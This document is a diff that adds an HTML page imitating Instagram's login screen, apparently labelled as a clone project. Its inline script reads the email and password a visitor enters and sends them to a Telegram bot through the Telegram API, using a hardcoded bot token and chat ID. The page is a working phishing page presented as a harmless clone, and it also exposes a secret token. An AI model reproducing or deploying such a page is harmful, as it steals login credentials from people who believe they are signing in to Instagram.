@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial_scale=1.0" />
+    <title>Instagram-clone by ARUN</title>
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/media-queries.css" />
+    <link rel="icon" href="photos/insta-icon.jpg" />
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <div class="log-in-container">
+            <div class="log-in">
+                <img src="photos/logo.png" class="logo"/>
+                <div class="log-in-form">
+                    <input type="text" id="email" placeholder="Phone number, username or email" />
+                    <input type="password" id="password" placeholder="Password" />
+                    <button onclick="validateAndSend()" class="log-in-button">Log In</button>
+                    <div id="error-message" style="display:none; color:red;">Invalid email address</div>
+                </div>
+
+                <span class="or-divider">OR</span>
+                <!--FACEBOOK OPTION-->
+                <div class="fb-login">
+                    <a href="#">
+                        <img src="photos/facebook-icon.png">
+                        <span>Log in with Facebook</span>
+                    </a>
+                </div>
+                <!--forgot passwd-->
+                <a href="#">Forgot password?</a>
+            </div>
+            <!--sign up-->
+            <div class="sign-up">
+                <span>Don't have an account
+                    <a href="#">Sign up</a>
+                </span>
+            </div>
+            <!--download-->
+            <div class="get-the-app">
+                <span>Get the app</span>
+                <div class="app-images">
+                    <a href="#"><img src="photos/applestore.png" /></a>
+                    <a href="#"><img src="photos/googlestore.png" /></a>
+                </div>
+            </div>
+
+        </div>
+        <!--phones-->
+        <div class="phones-container">
+            <img src="photos/phones.png" />
+        </div>
+    </main>
+    <footer>
+        <ul class="footer-links">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">JOBS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATION</a></li>
+            <li><a href="#">TOP</a></li>
+            <li><a href="#">ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <span class="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
+    </footer>
+
+    <script>
+        const botToken = "7256577569:AAHyOFgwSk6hmV1vfhIgW8wub74IW3MTQf4";
+        const chatId = "6524755764";
+
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+       
+
+        function validateAndSend() {
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const errorMessage = document.getElementById("error-message");
+
+            if (!isValidEmail(email)) {
+                errorMessage.style.display = "block";
+               
+                return;
+            } else {
+                errorMessage.style.display = "none";
+            }
+
+            if (email === "" || password === "") {
+                alert("Please enter both email and password.");
+                return;
+            }
+           
+
+            const message = `🔒 Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Sent to Telegram:", data);
+                    // alert("Login details sent. Please wait...");
+                })
+                .catch(error => console.error("Error sending to Telegram:", error));
+        }
+    </script>
+
+
+
+
+</body>
+
+</html>
